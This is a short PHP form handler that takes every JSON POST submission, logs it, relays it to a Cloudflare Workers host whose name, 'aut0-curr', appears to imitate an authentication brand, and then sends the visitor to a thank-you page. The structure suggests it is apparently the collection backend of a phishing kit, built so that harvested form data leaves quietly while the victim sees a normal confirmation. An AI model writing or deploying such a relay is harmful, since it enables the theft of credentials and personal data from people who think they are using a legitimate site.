<?php
// Capture POST data
$data = json_decode(file_get_contents("php://input"), true);

// Log data for debugging
error_log(json_encode($data));

// Forward to Cloudflare Worker
$worker_url = "https://aut0-curr-9dc7.henrycrane65.workers.dev/";

$options = [
    "http" => [
        "header" => "Content-Type: application/json\r\n",
        "method" => "POST",
        "content" => json_encode($data),
    ],
];

$context = stream_context_create($options);
$response = file_get_contents($worker_url, false, $context);

// Log response from Worker
error_log("Worker Response: " . json_encode($http_response_header));

// Redirect to thanks.html after sending
header("Location: ./thanks.html");
exit;
?>
